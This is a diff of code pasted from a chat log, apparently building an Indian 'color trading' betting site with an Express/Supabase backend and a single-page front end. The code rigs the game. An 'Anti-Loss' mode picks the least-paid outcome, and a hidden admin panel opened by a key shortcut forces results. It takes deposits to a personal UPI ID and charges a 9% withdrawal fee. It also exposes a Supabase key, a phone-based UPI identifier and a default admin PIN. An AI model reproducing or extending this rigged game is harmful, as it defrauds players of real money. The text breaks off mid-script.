@@ -1,171 +1,722 @@
-[12:32 am, 20/08/2026] Saurabh Yadav: const express = require('express');
-const { createClient } = require('@supabase/supabase-js');
-const path = require('path');
-const cors = require('cors');
-
-const app = express();
-app.use(cors());
-app.use(express.json());
-app.use(express.static(__dirname));
-
-// 🔗 Supabase Connection
-const SUPABASE_URL = "https://gbyrdjwcbfsdibnrvqzz.supabase.co";
-const SUPABASE_KEY = "sb_publishable_KyF98L8mcaHentW4gqhB1Q_2bAlCMaF"; 
-const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
-
-// 🧠 Anti-Loss Calculated Minimum Payout Logic
-app.get('/api/calculate-result', async (req, res) => {
-    try {
-        const { data: bets, error } = await supabase.from('live_bets').select('*');
-        if (error) throw error;
-
-        let totalColor = { Red: 0, Green: 0, Violet: 0 };…
-[12:35 am, 20/08/2026] Saurabh Yadav: <!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Color Trading Game</title>
+    <title>ROYAL COLOR & NUMBER TRADING VIP</title>
+    <!-- Tailwind CSS for Modern Dark UI -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- QRCodeJS Library for Real-time UPI QR Generation -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; background: #121212; color: white; margin: 0; padding: 20px; }
-        .card { background: #1e1e1e; padding: 20px; border-radius: 12px; max-width: 400px; margin: auto; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
-        .btn { padding: 12px 20px; margin: 5px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; color: white; }
-        .red { background: #e53935; }
-        .green { background: #43a047; }
-        .violet { background: #8e24aa; }
-        .num-btn { background: #333; width: 50…
-[12:50 am, 20/08/2026] Saurabh Yadav: color-trading-h6wg1ljt0-saurabh-dev.vercel.app
-[1:08 am, 20/08/2026] Saurabh Yadav: const express = require('express');
-const { createClient } = require('@supabase/supabase-js');
-const path = require('path');
-const cors = require('cors');
-
-const app = express();
-app.use(cors());
-app.use(express.json());
-app.use(express.static(__dirname));
-
-const SUPABASE_URL = "https://gbyrdjwcbfsdibnrvqzz.supabase.co";
-const SUPABASE_KEY = "sb_publishable_KyF98L8mcaHentW4gqhB1Q_2bAlCMaF"; 
-const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
-
-// 🧠 Anti-Loss Calculation (Number = 9x | Color = 1.9x)
-app.get('/api/calculate-result', async (req, res) => {
-    try {
-        const { data: bets, error } = await supabase.from('live_bets').select('*');
-        if (error) throw error;
-
-        let colorBets = { Red: 0, Green: 0, Violet: 0 };
-        let numbe…
-[1:12 am, 20/08/2026] Saurabh Yadav: <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Royal Color Trading VIP</title>
-    <style>
-        * { box-sizing: border-box; font-family: 'Poppins', Arial, sans-serif; }
-        body { background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
-        .container { background: #1e293b; padding: 25px; border-radius: 20px; width: 100%; max-width: 450px; text-align: center; border: 1px solid #334155; }
-        .timer-box { background: linear-gradient(135deg, #1e1b4b, #312e81); border: 2px solid #6366f1; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
-        .timer-title { font-size: 14px; color: #a5b4fc; text-transform: uppercase; }
-        #timer { font-size: 42px; font-weight: 800; color: #38bdf8; font-family: monospace; }
-        .result-box { background: #0f172a; border-radius: 10px; padding: 10px; margin-bottom: 20px; font-size: 18px; font-weight: bold; }
-        #result { font-size: 24px; color: #facc15; }
-        .input-group { margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #4ade80; font-size: 20px; font-weight: bold; text-align: center; outline: none; }
-        .color-btns { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 20px; }
-        .btn-color { padding: 15px; border: none; border-radius: 10px; font-size: 15px; font-weight: bold; color: white; cursor: pointer; }
-        .green { background: linear-gradient(135deg, #16a34a, #22c55e); }
-        .violet { background: linear-gradient(135deg, #7c3aed, #a855f7); }
-        .red { background: linear-gradient(135deg, #dc2626, #ef4444); }
-        .number-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin-bottom: 20px; }
-        .btn-num { width: 100%; padding: 10px 0; border-radius: 10px; border: 2px solid #475569; background: #334155; color: white; font-size: 14px; font-weight: bold; cursor: pointer; }
-        .btn-num span { display: block; font-size: 10px; color: #38bdf8; }
+        body { background-color: #0f0f17; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .card-bg { background-color: #1a1b26; }
+        .gold-color { color: #f7c645; }
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0f0f17; }
+        ::-webkit-scrollbar-thumb { background: #1a1b26; border-radius: 4px; }
     </style>
 </head>
-<body>
+<body class="flex justify-center min-h-screen">
 
-<div class="container">
-    <div class="timer-box">
-        <div class="timer-title">Count Down</div>
-        <div id="timer">00:30</div>
+    <div class="w-full max-w-md bg-[#0f0f17] flex flex-col justify-between shadow-2xl relative pb-10 border-x border-gray-800">
+        
+        <!-- HEADER -->
+        <div class="text-center pt-4 pb-2 border-b border-gray-800">
+            <h1 class="text-xl font-bold gold-color tracking-wide">👑 ROYAL TRADING VIP</h1>
+            <p class="text-xs text-gray-400">Color: 1.9x Profit | Number 0-9: 9x Profit</p>
+        </div>
+
+        <!-- USER STATUS BAR -->
+        <div class="mx-4 my-2 p-2 card-bg rounded-lg flex justify-between items-center border border-gray-700">
+            <span id="userStatus" class="text-xs font-bold text-red-400">Status: 🔒 Guest Mode</span>
+            <div id="userAuthBtns">
+                <button onclick="openModal('authModal')" class="bg-indigo-500 hover:bg-indigo-600 text-black text-xs font-bold px-3 py-1 rounded">Login / Register</button>
+            </div>
+        </div>
+
+        <!-- BALANCE CARD -->
+        <div class="mx-4 my-2 p-4 bg-[#16161e] border border-gray-700 rounded-xl text-center">
+            <span class="text-xs text-gray-400 font-bold block">AVAILABLE WALLET BALANCE</span>
+            <span id="walletBalance" class="text-3xl font-extrabold text-green-400 my-1 block">₹0</span>
+            
+            <div class="grid grid-cols-4 gap-1 mt-3">
+                <button onclick="openDepositModal()" class="bg-green-500 text-black text-xs font-bold py-1.5 rounded hover:opacity-90">⚡ + Deposit</button>
+                <button onclick="openWithdrawModal()" class="bg-red-400 text-black text-xs font-bold py-1.5 rounded hover:opacity-90">💸 - Withdraw</button>
+                <button onclick="openHistoryModal()" class="bg-amber-400 text-black text-xs font-bold py-1.5 rounded hover:opacity-90">📜 History</button>
+                <button onclick="openStatsModal()" class="bg-indigo-400 text-black text-xs font-bold py-1.5 rounded hover:opacity-90">📊 Stats</button>
+            </div>
+            
+            <button onclick="openLiveChat()" class="w-full mt-3 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold py-2 rounded">💬 24x7 Live Online Support</button>
+        </div>
+
+        <!-- TIMER & PROGRESS BAR -->
+        <div class="mx-4 my-1 text-center">
+            <div id="timerLabel" class="text-amber-400 font-bold text-sm mb-1">⏳ Time Left: 40s</div>
+            <div class="w-full bg-gray-800 rounded-full h-2">
+                <div id="timerBar" class="bg-indigo-400 h-2 rounded-full transition-all duration-1000" style="width: 100%;"></div>
+            </div>
+        </div>
+
+        <!-- BET AMOUNT SELECTOR -->
+        <div class="mx-4 my-2 text-center">
+            <label class="text-xs font-bold text-gray-400 block mb-1">SELECT BET AMOUNT (₹10 - ₹500 MAX)</label>
+            <div class="flex justify-center items-center gap-2">
+                <button onclick="adjustBet(-1)" class="bg-red-400 text-black font-bold px-3 py-1 rounded">➖</button>
+                <input type="number" id="betAmount" value="10" class="w-24 text-center bg-[#1f2335] border border-gray-600 text-white font-bold py-1 rounded" readonly>
+                <button onclick="adjustBet(1)" class="bg-green-400 text-black font-bold px-3 py-1 rounded">➕</button>
+            </div>
+            <div class="flex justify-center gap-1 mt-2">
+                <button onclick="setBetStep(10)" class="bg-indigo-500 text-black text-xs font-bold px-3 py-1 rounded">Step 10</button>
+                <button onclick="setBetStep(50)" class="bg-gray-800 text-indigo-400 text-xs font-bold px-3 py-1 rounded">Step 50</button>
+                <button onclick="setBetStep(100)" class="bg-gray-800 text-indigo-400 text-xs font-bold px-3 py-1 rounded">Step 100</button>
+                <button onclick="setBetStep(500)" class="bg-gray-800 text-amber-400 text-xs font-bold px-3 py-1 rounded">Max 500</button>
+            </div>
+        </div>
+
+        <!-- COLOR CHOICE BUTTONS -->
+        <div class="mx-4 my-2 text-center">
+            <label class="text-xs font-bold text-gray-400 block mb-1">CHOOSE COLOR (1.9x PROFIT)</label>
+            <div class="grid grid-cols-3 gap-2">
+                <button onclick="selectChoice('Red', 'color')" class="bet-btn bg-red-500 text-black font-bold py-2 rounded">🔴 RED (1.9x)</button>
+                <button onclick="selectChoice('Green', 'color')" class="bet-btn bg-green-500 text-black font-bold py-2 rounded">🟢 GREEN (1.9x)</button>
+                <button onclick="selectChoice('Violet', 'color')" class="bet-btn bg-purple-400 text-black font-bold py-2 rounded">🟣 VIOLET (1.9x)</button>
+            </div>
+        </div>
+
+        <!-- NUMBER CHOICE BUTTONS -->
+        <div class="mx-4 my-2 text-center">
+            <label class="text-xs font-bold text-gray-400 block mb-1">CHOOSE NUMBER 0-9 (9x PROFIT)</label>
+            <div class="grid grid-cols-5 gap-1.5">
+                <button onclick="selectChoice(0, 'number')" class="bet-btn bg-purple-400 text-black font-bold py-2 rounded text-xs">0<br>(9x)</button>
+                <button onclick="selectChoice(1, 'number')" class="bet-btn bg-green-400 text-black font-bold py-2 rounded text-xs">1<br>(9x)</button>
+                <button onclick="selectChoice(2, 'number')" class="bet-btn bg-red-400 text-black font-bold py-2 rounded text-xs">2<br>(9x)</button>
+                <button onclick="selectChoice(3, 'number')" class="bet-btn bg-green-400 text-black font-bold py-2 rounded text-xs">3<br>(9x)</button>
+                <button onclick="selectChoice(4, 'number')" class="bet-btn bg-red-400 text-black font-bold py-2 rounded text-xs">4<br>(9x)</button>
+                <button onclick="selectChoice(5, 'number')" class="bet-btn bg-purple-400 text-black font-bold py-2 rounded text-xs">5<br>(9x)</button>
+                <button onclick="selectChoice(6, 'number')" class="bet-btn bg-red-400 text-black font-bold py-2 rounded text-xs">6<br>(9x)</button>
+                <button onclick="selectChoice(7, 'number')" class="bet-btn bg-green-400 text-black font-bold py-2 rounded text-xs">7<br>(9x)</button>
+                <button onclick="selectChoice(8, 'number')" class="bet-btn bg-red-400 text-black font-bold py-2 rounded text-xs">8<br>(9x)</button>
+                <button onclick="selectChoice(9, 'number')" class="bet-btn bg-green-400 text-black font-bold py-2 rounded text-xs">9<br>(9x)</button>
+            </div>
+            <div id="choiceDisplay" class="text-sm font-bold text-indigo-400 mt-2">🎯 Selection: None (Watching Mode)</div>
+            <button onclick="clearSelection()" class="text-xs text-gray-400 underline mt-1">Clear Selection</button>
+        </div>
+
+        <!-- RESULTS CARD -->
+        <div class="mx-4 my-2 p-3 bg-[#16161e] border border-gray-800 rounded-lg text-center">
+            <div id="resultColor" class="text-lg font-bold gold-color">🎰 WINNING RESULT: --</div>
+            <div id="resultStatus" class="text-xs text-gray-300 mt-1">Waiting for round to finish...</div>
+        </div>
+
+        <!-- HISTORY -->
+        <div class="mx-4 my-2 text-center">
+            <label class="text-xs font-bold text-gray-400 block mb-1">LAST 10 ROUNDS HISTORY</label>
+            <div id="historyList" class="flex justify-center gap-1">
+                <span class="text-xs text-gray-500 italic">[ No History Yet ]</span>
+            </div>
+        </div>
     </div>
 
-    <div class="result-box">
-        Previous Result: <span id="result">-</span>
+    <!-- ================= MODALS ================= -->
+
+    <!-- AUTH MODAL -->
+    <div id="authModal" class="hidden fixed inset-0 bg-black bg-opacity-75 flex justify-center items-center p-4">
+        <div class="bg-[#1a1b26] p-6 rounded-xl w-full max-w-sm border border-gray-700 relative">
+            <button onclick="closeModal('authModal')" class="absolute top-2 right-3 text-gray-400 hover:text-white">✕</button>
+            <h2 id="authTitle" class="text-lg font-bold text-center gold-color mb-4">USER LOGIN</h2>
+            
+            <div id="authFields" class="space-y-3">
+                <input type="text" id="authName" placeholder="Full Name (For Register)" class="hidden w-full bg-[#0f0f17] border border-gray-600 p-2 text-sm rounded">
+                <input type="text" id="authMobile" placeholder="10-Digit Mobile" class="w-full bg-[#0f0f17] border border-gray-600 p-2 text-sm rounded">
+                <input type="password" id="authPassword" placeholder="Password" class="w-full bg-[#0f0f17] border border-gray-600 p-2 text-sm rounded">
+                <input type="password" id="authPin" placeholder="4-Digit Security PIN (For Register/Reset)" class="hidden w-full bg-[#0f0f17] border border-gray-600 p-2 text-sm rounded">
+            </div>
+
+            <button id="authPrimaryBtn" onclick="submitAuth()" class="w-full mt-4 bg-green-500 text-black font-bold py-2 rounded text-sm">Login Now</button>
+            <div class="flex justify-between mt-3 text-xs">
+                <button onclick="toggleAuthMode('forgot')" class="text-amber-400 underline">Forgot Password?</button>
+                <button id="authToggleBtn" onclick="toggleAuthMode('register')" class="text-indigo-400 underline">New User? Register</button>
+            </div>
+        </div>
     </div>
 
-    <div class="input-group">
-        <label>Contract Money (₹)</label>
-        <input type="number" id="betAmount" value="10" min="10">
+    <!-- DEPOSIT MODAL -->
+    <div id="depositModal" class="hidden fixed inset-0 bg-black bg-opacity-75 flex justify-center items-center p-4">
+        <div class="bg-white text-black p-5 rounded-xl w-full max-w-sm text-center relative max-h-[90vh] overflow-y-auto">
+            <button onclick="closeModal('depositModal')" class="absolute top-2 right-3 text-gray-600 font-bold">✕</button>
+            <h2 class="text-2xl font-black text-purple-800">PhonePe</h2>
+            <p class="text-xs font-bold text-gray-600">Scan & Pay Using PhonePe / Any UPI App</p>
+            
+            <div id="qrcode" class="flex justify-center my-3"></div>
+            <p id="payeeName" class="text-sm font-bold">SAURABH SINGH</p>
+            <p id="qrAmountStatus" class="text-xs font-bold text-purple-700">Scanning Amount: ₹100</p>
+
+            <div class="my-2 flex justify-center gap-1">
+                <button onclick="setDepositAmount(100)" class="bg-purple-100 text-purple-800 text-xs font-bold px-2 py-1 rounded">₹100</button>
+                <button onclick="setDepositAmount(500)" class="bg-purple-100 text-purple-800 text-xs font-bold px-2 py-1 rounded">₹500</button>
+                <button onclick="setDepositAmount(1000)" class="bg-purple-100 text-purple-800 text-xs font-bold px-2 py-1 rounded">₹1000</button>
+            </div>
+
+            <input type="number" id="depositAmount" value="100" class="w-full border p-2 text-sm rounded my-1 text-center font-bold" placeholder="Amount">
+            <input type="text" id="depositUtr" class="w-full border p-2 text-sm rounded my-1 text-center" placeholder="Enter 12-Digit UTR / Ref No">
+
+            <button onclick="submitDeposit()" class="w-full mt-2 bg-purple-700 text-white font-bold py-2 rounded text-sm">Submit Payment Reference</button>
+        </div>
     </div>
 
-    <p style="font-size: 12px; color: #94a3b8;">SELECT COLOR (1.9x PROFIT)</p>
-    <div class="color-btns">
-        <button class="btn-color green" onclick="placeBet('color', 'Green')">Green 1.9x</button>
-        <button class="btn-color violet" onclick="placeBet('color', 'Violet')">Violet 1.9x</button>
-        <button class="btn-color red" onclick="placeBet('color', 'Red')">Red 1.9x</button>
+    <!-- WITHDRAW MODAL -->
+    <div id="withdrawModal" class="hidden fixed inset-0 bg-black bg-opacity-75 flex justify-center items-center p-4">
+        <div class="bg-[#1a1b26] p-5 rounded-xl w-full max-w-sm border border-gray-700 relative">
+            <button onclick="closeModal('withdrawModal')" class="absolute top-2 right-3 text-gray-400">✕</button>
+            <h2 class="text-md font-bold text-red-400 text-center mb-1">WITHDRAW TO BANK / UPI</h2>
+            <p class="text-xs text-amber-400 italic text-center mb-3">Processing time is up to 24 hours.</p>
+
+            <select id="withdrawMethod" class="w-full bg-[#0f0f17] border border-gray-600 p-2 text-sm rounded mb-2">
+                <option>UPI ID</option>
+                <option>Bank Transfer (IFSC)</option>
+            </select>
+            <input type="text" id="withdrawAccount" placeholder="Enter UPI ID / Bank A/C No" class="w-full bg-[#0f0f17] border border-gray-600 p-2 text-sm rounded mb-2">
+            <input type="text" id="withdrawIfsc" placeholder="IFSC Code (If Bank Chosen)" class="w-full bg-[#0f0f17] border border-gray-600 p-2 text-sm rounded mb-2">
+            <input type="number" id="withdrawAmount" placeholder="Amount (Min ₹100)" class="w-full bg-[#0f0f17] border border-gray-600 p-2 text-sm rounded mb-1" oninput="calcFee()">
+            
+            <div id="feeDisplay" class="text-xs text-red-400 font-bold mb-2 text-center">Fee (9%): ₹9 | You Receive: ₹91</div>
+
+            <input type="password" id="withdrawPassword" placeholder="Confirm Password" class="w-full bg-[#0f0f17] border border-gray-600 p-2 text-sm rounded mb-3">
+
+            <button onclick="submitWithdraw()" class="w-full bg-red-500 text-black font-bold py-2 rounded text-sm">Confirm Withdrawal</button>
+        </div>
     </div>
 
-    <p style="font-size: 12px; color: #94a3b8;">SELECT NUMBER 0-9 (9x PROFIT)</p>
-    <div class="number-grid">
-        <button class="btn-num" onclick="placeBet('number', '0')">0 <span>9x</span></button>
-        <button class="btn-num" onclick="placeBet('number', '1')">1 <span>9x</span></button>
-        <button class="btn-num" onclick="placeBet('number', '2')">2 <span>9x</span></button>
-        <button class="btn-num" onclick="placeBet('number', '3')">3 <span>9x</span></button>
-        <button class="btn-num" onclick="placeBet('number', '4')">4 <span>9x</span></button>
-        <button class="btn-num" onclick="placeBet('number', '5')">5 <span>9x</span></button>
-        <button class="btn-num" onclick="placeBet('number', '6')">6 <span>9x</span></button>
-        <button class="btn-num" onclick="placeBet('number', '7')">7 <span>9x</span></button>
-        <button class="btn-num" onclick="placeBet('number', '8')">8 <span>9x</span></button>
-        <button class="btn-num" onclick="placeBet('number', '9')">9 <span>9x</span></button>
+    <!-- HISTORY MODAL -->
+    <div id="historyModal" class="hidden fixed inset-0 bg-black bg-opacity-75 flex justify-center items-center p-4">
+        <div class="bg-[#1a1b26] p-4 rounded-xl w-full max-w-md border border-gray-700 relative">
+            <button onclick="closeModal('historyModal')" class="absolute top-2 right-3 text-gray-400">✕</button>
+            <h2 class="text-md font-bold text-center gold-color mb-3">TRANSACTION HISTORY</h2>
+            
+            <div class="max-h-60 overflow-y-auto">
+                <table class="w-full text-xs text-left border-collapse">
+                    <thead>
+                        <tr class="border-b border-gray-700 text-gray-400">
+                            <th class="p-1">Type</th>
+                            <th class="p-1">Amount</th>
+                            <th class="p-1">Details</th>
+                            <th class="p-1">Time</th>
+                        </tr>
+                    </thead>
+                    <tbody id="historyTableBody"></tbody>
+                </table>
+            </div>
+        </div>
     </div>
-</div>
 
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<script>
-    const SUPABASE_URL = "https://gbyrdjwcbfsdibnrvqzz.supabase.co";
-    const SUPABASE_KEY = "sb_publishable_KyF98L8mcaHentW4gqhB1Q_2bAlCMaF";
-    const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+    <!-- STATS MODAL -->
+    <div id="statsModal" class="hidden fixed inset-0 bg-black bg-opacity-75 flex justify-center items-center p-4">
+        <div class="bg-[#1a1b26] p-5 rounded-xl w-full max-w-sm border border-gray-700 relative text-center">
+            <button onclick="closeModal('statsModal')" class="absolute top-2 right-3 text-gray-400">✕</button>
+            <h2 class="text-md font-bold gold-color mb-3">ACCOUNT ANALYTICS</h2>
+            <div class="bg-[#16161e] p-3 rounded-lg space-y-2 text-xs font-bold">
+                <p class="text-green-400">Total Deposit: ₹<span id="statDeposit">0</span></p>
+                <p class="text-red-400">Total Withdrawals: ₹<span id="statWithdraw">0</span></p>
+                <p class="text-green-400">Total Amount Won: ₹<span id="statWon">0</span></p>
+                <p class="text-red-400">Total Amount Lost: ₹<span id="statLost">0</span></p>
+            </div>
+        </div>
+    </div>
 
-    function getGlobalTimeLeft() {
-        const now = Math.floor(Date.now() / 1000);
-        return 30 - (now % 30);
-    }
+    <!-- ADMIN PANEL MODAL -->
+    <div id="adminModal" class="hidden fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center p-2 z-50">
+        <div class="bg-[#1a1b26] p-4 rounded-xl w-full max-w-2xl border border-gold-color max-h-[95vh] overflow-y-auto relative">
+            <button onclick="closeModal('adminModal')" class="absolute top-2 right-3 text-gray-400">✕</button>
+            <h2 class="text-lg font-bold text-center gold-color mb-2">ADMIN CONTROL & REAL-TIME MONITOR</h2>
+            
+            <div class="text-center mb-3">
+                <button onclick="changeAdminPin()" class="bg-amber-500 text-black text-xs font-bold px-3 py-1 rounded">🔑 Change Admin PIN</button>
+            </div>
 
-    async function placeBet(type, choice) {
-        let timeLeft = getGlobalTimeLeft();
-        if(timeLeft <= 5) { alert("Betting closed for this round!"); return; }
-        const amount = document.getElementById('betAmount').value;
-        if(!amount || amount <= 0) { alert("Enter valid amount"); return; }
+            <!-- ADMIN TABS -->
+            <div class="flex gap-2 border-b border-gray-700 mb-3 text-xs">
+                <button onclick="switchAdminTab('betsTab')" class="p-2 font-bold text-indigo-400 border-b-2 border-indigo-400">Live Bets & Control</button>
+                <button onclick="switchAdminTab('depsTab')" class="p-2 font-bold text-gray-400">Deposits</button>
+                <button onclick="switchAdminTab('withsTab')" class="p-2 font-bold text-gray-400">Withdrawals</button>
+                <button onclick="switchAdminTab('usersTab')" class="p-2 font-bold text-gray-400">Users</button>
+            </div>
 
-        await _supabase.from('live_bets').insert([{ mobile: 'guest', choice_type: type, choice: choice, amount: parseInt(amount) }]);
-        alert(Bet successful: ₹${amount} on ${choice});
-    }
+            <!-- BETS TAB -->
+            <div id="betsTab" class="space-y-3">
+                <div class="bg-[#1f2335] p-2 rounded text-xs flex justify-between font-bold">
+                    <span class="text-red-400">RED: ₹<span id="adminRedBet">0</span></span>
+                    <span class="text-green-400">GREEN: ₹<span id="adminGreenBet">0</span></span>
+                    <span class="text-purple-400">VIOLET: ₹<span id="adminVioletBet">0</span></span>
+                    <span class="gold-color">TOTAL: ₹<span id="adminTotalBet">0</span></span>
+                </div>
 
-    let hasCalculated = false;
+                <div class="text-xs font-bold text-gray-400">Anti-Loss & Control:</div>
+                <div class="flex gap-2">
+                    <button onclick="setAntiLoss(true)" class="bg-green-500 text-black text-xs font-bold p-2 rounded flex-1">🛡️ Anti-Loss ON</button>
+                    <button onclick="setAntiLoss(false)" class="bg-amber-500 text-black text-xs font-bold p-2 rounded flex-1">🎲 Random Mode</button>
+                </div>
 
-    setInterval(async () => {
-        let timeLeft = getGlobalTimeLeft();
-        document.getElementById('timer').innerText = 00:${timeLeft < 10 ? '0' : ''}${timeLeft};
+                <div class="text-xs font-bold text-gray-400 mt-2">Force Color Result:</div>
+                <div class="flex gap-2">
+                    <button onclick="forceColor('Red')" class="bg-red-500 text-black text-xs font-bold p-1.5 rounded flex-1">Force RED</button>
+                    <button onclick="forceColor('Green')" class="bg-green-500 text-black text-xs font-bold p-1.5 rounded flex-1">Force GREEN</button>
+                    <button onclick="forceColor('Violet')" class="bg-purple-400 text-black text-xs font-bold p-1.5 rounded flex-1">Force VIOLET</button>
+                </div>
 
-        if(timeLeft === 30) {
-            hasCalculated = false;
+                <div id="adminStatus" class="text-xs text-center font-bold text-green-400 mt-2">Mode: Smart Anti-Loss Active</div>
+            </div>
+
+            <!-- DEPOSITS TAB -->
+            <div id="depsTab" class="hidden max-h-60 overflow-y-auto">
+                <table class="w-full text-xs text-left border-collapse">
+                    <thead>
+                        <tr class="border-b border-gray-700 text-gray-400">
+                            <th>User</th><th>Amt</th><th>UTR</th><th>Status</th><th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminDepTable"></tbody>
+                </table>
+            </div>
+
+            <!-- WITHDRAWALS TAB -->
+            <div id="withsTab" class="hidden max-h-60 overflow-y-auto">
+                <table class="w-full text-xs text-left border-collapse">
+                    <thead>
+                        <tr class="border-b border-gray-700 text-gray-400">
+                            <th>User</th><th>Amt</th><th>Pay</th><th>Details</th><th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminWithTable"></tbody>
+                </table>
+            </div>
+
+            <!-- USERS TAB -->
+            <div id="usersTab" class="hidden max-h-60 overflow-y-auto">
+                <table class="w-full text-xs text-left border-collapse">
+                    <thead>
+                        <tr class="border-b border-gray-700 text-gray-400">
+                            <th>Name</th><th>Mobile</th><th>Balance</th><th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminUserTable"></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- JAVASCRIPT ENGINE -->
+    <script>
+        // SHA-256 Polyfill/Hashing using Web Crypto API
+        async function hashString(str) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(str);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
         }
 
-        if(timeLeft === 1 && !hasCalculated) {
-            hasCalculated = true;
-            try {
-                let res = await fetch('/api/calculate-result');
-                let data = await res.json();
-                if(data.success) {
-                    document.getElementById('result').innerText = data.winningNumber;
+        // DATABASE ENGINE (LocalStorage Based)
+        let db = {
+            users: JSON.parse(localStorage.getItem('db_users')) || {},
+            deposits: JSON.parse(localStorage.getItem('db_deposits')) || [],
+            withdrawals: JSON.parse(localStorage.getItem('db_withdrawals')) || [],
+            transactions: JSON.parse(localStorage.getItem('db_txs')) || [],
+            adminPin: localStorage.getItem('db_adminPin') || '1234'
+        };
+
+        function saveDb() {
+            localStorage.setItem('db_users', JSON.stringify(db.users));
+            localStorage.setItem('db_deposits', JSON.stringify(db.deposits));
+            localStorage.setItem('db_withdrawals', JSON.stringify(db.withdrawals));
+            localStorage.setItem('db_txs', JSON.stringify(db.transactions));
+            localStorage.setItem('db_adminPin', db.adminPin);
+        }
+
+        // STATE VARIABLES
+        let currentUser = null;
+        let timerSeconds = 40;
+        let selectedChoice = null;
+        let choiceType = null;
+        let stepValue = 10;
+        let history = [];
+        let colorBets = { Red: 0, Green: 0, Violet: 0 };
+        let numberBets = { 0: 0, 1: 0, 2: 0, 3: 0, 4: 0, 5: 0, 6: 0, 7: 0, 8: 0, 9: 0 };
+        let antiLossMode = true;
+        let forcedNextNumber = null;
+        let currentAuthMode = 'login';
+        let upiId = "9935088115-2@ibl";
+        let payeeName = "SAURABH SINGH";
+        let qrCodeObj = null;
+
+        // INIT & TIMER
+        window.onload = () => {
+            startTimer();
+            // Shortcut for Admin Panel (Ctrl + Shift + A)
+            window.addEventListener('keydown', (e) => {
+                if (e.ctrlKey && e.shiftKey && (e.key === 'A' || e.key === 'a')) {
+                    e.preventDefault();
+                    promptAdminLogin();
                 }
-            } catch(e) { console.log(e); }
-        }
-    }, 1000);
-</script>
+            });
+        };
 
+        function startTimer() {
+            setInterval(() => {
+                if (timerSeconds > 0) {
+                    timerSeconds--;
+                    document.getElementById('timerLabel').innerText = timerSeconds <= 10 ? `🔒 TIME LOCKED: ${timerSeconds}s` : `⏳ Time Left: ${timerSeconds}s`;
+                    document.getElementById('timerBar').style.width = `${(timerSeconds / 40) * 100}%`;
+                } else {
+                    evaluateRound();
+                    timerSeconds = 40;
+                }
+            }, 1000);
+        }
+
+        // AUTHENTICATION LOGIC
+        async function submitAuth() {
+            const mobile = document.getElementById('authMobile').value.trim();
+            const password = document.getElementById('authPassword').value.trim();
+            const name = document.getElementById('authName').value.trim();
+            const pin = document.getElementById('authPin').value.trim();
+
+            if (mobile.length !== 10 || !password) {
+                alert("Please enter valid details!"); return;
+            }
+
+            const pwdHash = await hashString(password);
+            const pinHash = pin ? await hashString(pin) : '';
+
+            if (currentAuthMode === 'login') {
+                if (db.users[mobile] && db.users[mobile].password === pwdHash) {
+                    currentUser = mobile;
+                    updateUserUi();
+                    closeModal('authModal');
+                } else {
+                    alert("Incorrect Mobile or Password!");
+                }
+            } else if (currentAuthMode === 'register') {
+                if (db.users[mobile]) {
+                    alert("Mobile already registered!"); return;
+                }
+                if (!name || pin.length !== 4) {
+                    alert("Enter full details and 4-digit PIN!"); return;
+                }
+                db.users[mobile] = { name, mobile, password: pwdHash, pin: pinHash, balance: 0 };
+                saveDb();
+                currentUser = mobile;
+                updateUserUi();
+                closeModal('authModal');
+            } else if (currentAuthMode === 'forgot') {
+                if (db.users[mobile] && db.users[mobile].pin === pinHash) {
+                    db.users[mobile].password = pwdHash;
+                    saveDb();
+                    alert("Password reset successfully! Please Login.");
+                    toggleAuthMode('login');
+                } else {
+                    alert("Invalid Mobile or Security PIN!");
+                }
+            }
+        }
+
+        function updateUserUi() {
+            if (currentUser) {
+                const u = db.users[currentUser];
+                document.getElementById('userStatus').innerText = `User: ${u.name} (+91 ${u.mobile})`;
+                document.getElementById('userStatus').className = "text-xs font-bold text-green-400";
+                document.getElementById('walletBalance').innerText = `₹${u.balance}`;
+                document.getElementById('userAuthBtns').innerHTML = `<button onclick="logout()" class="bg-red-400 text-black text-xs font-bold px-3 py-1 rounded">Logout</button>`;
+            } else {
+                document.getElementById('userStatus').innerText = `Status: 🔒 Guest Mode`;
+                document.getElementById('userStatus').className = "text-xs font-bold text-red-400";
+                document.getElementById('walletBalance').innerText = `₹0`;
+                document.getElementById('userAuthBtns').innerHTML = `<button onclick="openModal('authModal')" class="bg-indigo-500 text-black text-xs font-bold px-3 py-1 rounded">Login / Register</button>`;
+            }
+        }
+
+        function logout() {
+            currentUser = null;
+            updateUserUi();
+        }
+
+        function toggleAuthMode(mode) {
+            currentAuthMode = mode;
